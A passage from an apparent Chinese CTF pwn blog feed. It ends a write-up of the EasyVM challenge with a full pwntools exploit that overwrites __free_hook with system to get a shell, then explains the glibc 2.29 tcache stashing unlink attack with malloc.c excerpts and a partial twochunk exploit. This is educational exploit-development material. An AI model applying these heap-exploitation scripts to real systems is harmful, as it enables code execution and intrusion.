rel="noopener">http://ctf.njupt.edu.cn/382.html#EasyVM）</a></p><p>实际上可以不用管这个密文，我们只需要dword_305C已经赋值，然后运行<code>&quot;\x09\x11\x99&quot;</code>即可</p><p>这道题可以有多种方法构造任意地址读写</p><p>1、利用<code>&quot;\x80\x03&quot;</code></p><p>2、利用<code>&quot;\x71\x76&quot;</code></p><p>具体攻击方法如下：</p><p>1、泄露程序基址，得到malloc@got地址</p><p>2、泄露malloc的地址，得到libc基址，从而计算free_hook地址和system地址</p><p>3、将”/bin/sh\x00”写入ptr，将system@addr写入free_hook</p><p>4、case 3 getshell</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">"./EasyVM"</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce</span><span class="params">(ins)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.send(ins)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_one</span><span class="params">(addr)</span>:</span></span><br><span class="line">    ins = <span class="string">'\x80\x03'</span>+p32(addr)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">1</span>)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">2</span>)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">3</span>)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x99'</span></span><br><span class="line">    produce(ins)</span><br><span class="line">    start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_one</span><span class="params">(addr,value)</span>:</span></span><br><span class="line">    ins = <span class="string">'\x80\x03'</span>+p32(addr)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">1</span>)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">2</span>)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">3</span>)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x00'</span>+<span class="string">'/bin'</span></span><br><span class="line">    ins += <span class="string">'\x80\x01'</span>+<span class="string">'/sh\x00'</span></span><br><span class="line">    ins += <span class="string">'\x99'</span></span><br><span class="line">    produce(ins)</span><br><span class="line">    start()</span><br><span class="line">    p.send(value)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">(s = <span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,s)</span><br><span class="line"></span><br><span class="line">gift()</span><br><span class="line">produce(<span class="string">"\x09\x11\x99"</span>)</span><br><span class="line">start()</span><br><span class="line">p.recvline()</span><br><span class="line">binary_base = int(p.recv(<span class="number">10</span>),<span class="number">16</span>) - <span class="number">0x6c0</span></span><br><span class="line">log.success(<span class="string">"binary_base:0x%x"</span>%binary_base)</span><br><span class="line"></span><br><span class="line">malloc_got = binary_base + <span class="number">0x2fcc</span></span><br><span class="line">read_one(malloc_got)</span><br><span class="line">p.recv()</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x70f00</span></span><br><span class="line">log.success(<span class="string">"libc_base:0x%x"</span>%libc_base)</span><br><span class="line">free_hook = libc_base + <span class="number">0x1b38b0</span> </span><br><span class="line">system_addr = libc_base + <span class="number">0x3ada0</span></span><br><span class="line">write_one(free_hook,p32(system_addr))</span><br><span class="line">gd()</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/PDKT-Team/ctf/tree/master/seccon2018/kindvm#bahasa-indonesia" target="_blank" rel="noopener">https://github.com/PDKT-Team/ctf/tree/master/seccon2018/kindvm#bahasa-indonesia</a></p><p><a href="https://blog.csdn.net/qq_25201379/article/details/83548147" target="_blank" rel="noopener">https://blog.csdn.net/qq_25201379/article/details/83548147</a></p><p><a href="https://dittozzz.top/2019/09/28/VM-pwn-%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">https://dittozzz.top/2019/09/28/VM-pwn-%E5%88%9D%E6%8E%A2/</a></p><p><a href="https://xz.aliyun.com/t/6865" target="_blank" rel="noopener">https://xz.aliyun.com/t/6865</a></p><p><a href="https://www.bilibili.com/read/cv5124780" target="_blank" rel="noopener">https://www.bilibili.com/read/cv5124780</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;近来很多比赛都有虚拟指令集pwn的题目，漏洞都是常规的漏洞，但是题目还算新颖，有一种计组做实验的感觉。&lt;/p&gt;
&lt;p&gt;这类题目主要就是搞清楚
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
      <category term="gxzy" scheme="https://j-kangel.github.io/tags/gxzy/"/>
    
  </entry>
  
  <entry>
    <title>tcache_stashing_unlink_attack</title>
    <link href="https://j-kangel.github.io/2020/04/10/tcache-stashing-unlink-attack/"/>
    <id>https://j-kangel.github.io/2020/04/10/tcache-stashing-unlink-attack/</id>
    <published>2020-04-09T16:16:32.000Z</published>
    <updated>2020-04-09T11:17:14.359Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>tcache_stashing_unlink_attack是glibc2.29和glibc2.30下的一种新型攻击技巧</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>该利用原理与unsorted bin attack和house of lore攻击相似，首先来回顾一下它们两个</p><h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h4><p>在glibc2.27/malloc/malloc.c: 3777中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>没有做任何检查，可以使bck-&gt;fd写入libc地址(av)</p><p>在glibc2.29/malloc/malloc.c: 3976中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>做了检查，因此unsorted bin attack在glibc2.29中失效</p><h4 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h4><p>house of lore利用的是small bin分配时的unlink</p><p>参考链接：<a href="https://wiki.x10sec.org/pwn/heap/house_of_lore/" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/house_of_lore/</a></p><p>在glibc2.23/malloc/malloc.c: 3397中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            <span class="comment">// 细致的检查</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从下面的这部分我们可以看出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">    goto errout;</span><br><span class="line">&#125;</span><br><span class="line">// 设置 victim 对应的 inuse 位</span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的fake chunk，并且同时满足之后的  bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake  chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。</p><p>在glibc2.27和2.29中也没有做过多的检查</p><h4 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h4><p>参考链接：<a href="https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312" target="_blank" rel="noopener">berming</a></p><p>在glibc2.29/malloc/malloc.c: 3664中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;    <span class="comment">//类似house of lore</span></span><br><span class="line">      bck-&gt;fd = bin;    <span class="comment">//没有做任何检查，类似unsorted bin</span></span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>可以看到，当small bin不为空而tcache不满时，可以达到与unsorted bin attack和house of lore相同的攻击效果。</p><p>看着挺有道理，但是当small bin不为空而tcache不满这两个条件在引入tcache之后似乎有点矛盾。因为<strong>我们不能越过Tcache向SmallBin中填入Chunk，也不能越过Tcache从SmallBin中取出Chunk。</strong>但是，事情总是充满玄机，这里不得不提calloc和unsorted bin中的last remainder与tcache的爱恨情仇。</p><p>1、<code>calloc</code>不会从<code>Tcache</code>拿<code>Chunk</code>，因此可以越过第二条矛盾“不能越过<code>Tcache</code>从<code>SmallBin</code>中取出<code>Chunk</code>”。</p><p>2、<code>Unsorted Bin</code>的<code>last remainder</code>基址，当申请的Chunk大于<code>Unsorted Bin</code>中Chunk的大小且其为<code>Unsorted Bin</code>中的唯一<code>Chunk</code>时，该<code>Chunk</code>不会进入<code>Tcache</code>。因此可以越过第一条矛盾“不能越过Tcache向SmallBin中填入Chunk”。</p><p>其实calloc与malloc的特性可以方式直接泄露libc，因为当我们使用malloc时会直接从tcache取chunk，tcache中的chunk不存在libc地址，而使用calloc时，会把chunk清零。但是malloc可以泄露堆地址。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>下面以gxzyCTF中的twochunk为例</p><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>checksec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/glibc2.29/twochunk/twochunk&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序功能较多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = (<span class="keyword">signed</span> <span class="keyword">int</span>)mmap((<span class="keyword">void</span> *)<span class="number">0x23333000</span>, <span class="number">0x2000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  buf = (<span class="keyword">void</span> *)(<span class="keyword">signed</span> <span class="keyword">int</span>)result;</span><br></pre></td></tr></table></figure><p>在0x23333000出mmap出了一块大小为2000的可读写空间，地址存放在bss段的buf中</p><p><img style="zoom:80%;" data-src="/2020/04/10/tcache-stashing-unlink-attack/1.png" class="lazyload"></p><p>在0x23333000处存放name和msg，同时有一次修改和打印name、msg的功能。</p><p>使用calloc申请堆块，大小为（0x80, 0x3ff ]，即small bin大小的堆块，同时最多申请两个，当size=0x23333可以使用一次malloc(0xE9)</p><p>free函数没问题</p><p>show函数只能使用一次</p><p>edit函数只能使用一次，有32字节溢出</p><p>存在后门函数，可以配合修改msg使用，前提是泄露libc地址</p><p>因此，这道题的目标就是泄露libc地址，刚好利用<code>类unsorted bin attack</code>可以将libc地址写道任意位置，我们可以写入0x23333000，然后利用打印name、msg函数泄露出来。</p><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>首先，我们需要一个用来两个不同大小的chunk，一个未满，一个已满</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>下面构造两个small bin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#first smallbin</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1a0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>) <span class="comment">#还剩下0x90大小的chunk</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>)  <span class="comment">#Unsorted Bin的last remainder</span></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img data-src="/2020/04/10/tcache-stashing-unlink-attack/2.png" class="lazyload"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>) <span class="comment">#为malloc(E9)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1a0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img data-src="/2020/04/10/tcache-stashing-unlink-attack/3.png" class="lazyload"></p><p>泄露堆地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">23333</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"heap:"</span>+hex(heap))</span><br></pre></td></tr></table></figure><p>tcache stashing unlink</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+<span class="string">'\x00'</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(heap<span class="number">-0x250</span>)+p64(<span class="number">0x23333000</span><span class="number">-0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br></pre></td></tr></table></figure><p>此时堆布局如下</p><p><img data-src="/2020/04/10/tcache-stashing-unlink-attack/4.png" class="lazyload"></p><p>以上过程首先是<code>类house of lore</code>攻击</p><p>检查：bck-&gt;fd = victim(通过)</p><p>结果：bin-&gt;bk = bck;  bck-&gt;fd = bin;</p><p>接下来是<code>类unsorted bin attack</code></p><p>检查：无</p><p>结果：bin-&gt;bk = bck;  bck-&gt;fd = bin;</p><p>攻击之后的效果如下</p><p><img data-src="/2020/04/10/tcache-stashing-unlink-attack/5.png" class="lazyload"></p><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./twochunk"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span 